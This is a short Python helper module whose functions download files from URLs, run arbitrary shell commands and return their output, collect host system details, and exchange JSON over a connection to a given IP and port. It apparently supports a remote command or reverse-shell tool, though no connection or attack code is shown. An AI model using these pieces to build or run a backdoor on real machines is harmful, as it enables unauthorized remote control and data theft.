"""
Common utilities.
"""

import requests
import subprocess
import argparse
import platform
import json

# downloads a file from a url to a specific location
def download(url):
    last_slash = url.rindex("/") + 1
    fname = url[last_slash:]

    r = requests.get(url)
    with open(fname, "wb") as f:
        f.write(r.content)

    return fname

# executes a command and returns the output
def execute_cmd(cmd):
    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    std_out = op.stdout.read()
    std_err = op.stderr.read()

    return std_out + std_err



# initializes argument parser
def init_argparse(desc):
    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("--port", "-p", type=int, required=True, help="The port to transmit on.")
    parser.add_argument("ip", type=str, help="The ip of the host to connect to.")
    return parser.parse_args()

# retuns system information gathered from platform mod
def sys_info():
    info = ('OS: {os}'
            '\nVersion: {version}'
            '\nArchitecture: {arch}'
            '\nNetwork Name: {name}\n'
            ).format(os=platform.system(), 
            version=platform.version(), 
            arch=platform.machine(), 
            name=platform.node())

    return info.encode()

# serializes data to send it
def send_data(conn, data):
    json_data = json.dumps(data)
    conn.send(json_data.encode())

# deserializes data to receive it
def recv_data(conn):
    json_data = ''
    while True:
        try:
            json_data += conn.recv(1024).decode()
            return json.loads(json_data)
        except json.decoder.JSONDecodeError:
            pass